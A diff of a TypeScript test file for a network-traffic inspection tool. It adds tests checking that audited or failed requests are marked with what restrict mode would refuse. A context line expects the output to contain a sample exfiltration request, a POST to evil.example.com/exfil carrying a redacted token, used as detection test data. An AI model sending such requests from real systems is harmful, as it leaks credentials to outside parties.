@@ -60,6 +60,29 @@ describe("renderInspectDetails", () => {
     expect(md.includes("POST https://evil.example.com/exfil?token=***")).toBe(true);
   });
 
+  it("says what restrict would have refused of a request audit let through", () => {
+    const audited: TrafficEvent = {
+      ...TIMELINE[0],
+      action: "audit",
+      wouldRefuse: "example-refusal",
+    };
+    const line = (renderInspectDetails([audited], t).split("```")[1] ?? "").trim();
+    expect(line).toBe(
+      "🚨 00:00.000: GET https://a.example.com/pkg -> 200 (708B) (restrict would refuse: example-refusal)",
+    );
+  });
+
+  it("says what restrict would have refused after a reason too", () => {
+    const failed: TrafficEvent = {
+      ...TIMELINE[2],
+      action: "failed",
+      reason: "dns-failed",
+      wouldRefuse: "example-refusal",
+    };
+    const line = (renderInspectDetails([failed], t).split("```")[1] ?? "").trim();
+    expect(line.endsWith("-> dns-failed (restrict would refuse: example-refusal)")).toBe(true);
+  });
+
   it("names the reason after the arrow instead of a status", () => {
     // 403, 502 and 503 mean different things; the number does not say which.
     expect(md.includes("-> not-allowed")).toBe(true);
